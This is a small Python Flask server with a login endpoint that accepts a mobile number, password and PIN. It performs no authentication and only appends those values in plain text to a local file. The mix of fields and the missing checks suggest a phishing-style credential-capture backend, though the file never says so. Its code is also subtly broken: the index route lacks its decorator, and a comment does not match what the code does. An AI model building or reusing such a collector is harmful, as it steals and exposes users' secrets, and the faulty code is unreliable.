from flask import Flask, request, jsonify, render_template
import datetime
import os

app = Flask(__name__)

# Path to the database file
DB_FILE_PATH = r"C:\Users\Hp\OneDrive\Documents\Desktop\hello\users_database.txt"
app.route('/', methods=['GET'])
def index():
    return render_template('index.html')
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    mobile = data.get('mobile')
    password = data.get('password')
    pin = data.get('pin')
    
    login_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # This is where we'd add actual authentication logic.
    # For now, just logging the data as requested.
    
    log_entry = f"Time: {login_time}, Mobile: {mobile}, Password: {password}, PIN: {pin}\n"
    
    try:
        with open(DB_FILE_PATH, "a") as f:
            f.write(log_entry)
        return jsonify({"status": "success", "message": "Data logged to plain text."})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    # Important: Create file with initial empty JSON object if it doesn't exist
    if not os.path.exists(DB_FILE_PATH):
        with open(DB_FILE_PATH, "w") as f:
            f.write("")
    port = os.environ.get('PORT', 5000)
    app.run(host='0.0.0.0', port=port)
